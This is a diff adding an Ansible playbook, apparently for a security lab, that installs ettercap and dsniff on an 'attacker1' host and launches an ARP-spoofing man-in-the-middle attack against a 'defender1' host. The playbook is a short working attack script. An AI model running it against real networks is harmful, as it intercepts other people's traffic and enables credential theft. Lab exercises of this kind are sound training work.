@@ -1,0 +1,16 @@
+---
+- name: Simulate MITM Attack
+  hosts: attacker1      #node1 will host the attack
+  become: yes
+  tasks:
+    - name: Install necessary tools
+      apt:
+        name: "{{ item }}"        #installs both ettercap and dsniff
+        state: present
+      with_items:
+        - ettercap-graphical      #security tool that is primarily used for MITM
+        - dsniff                  #security tool that captures information from network protocols (http, tcp)
+
+    - name: Start MITM attack
+      command: ettercap -T -M arp:remote {{ hostvars['defender1']['ansible_host'] }}
+        #performs an address resolution protocol spoof.
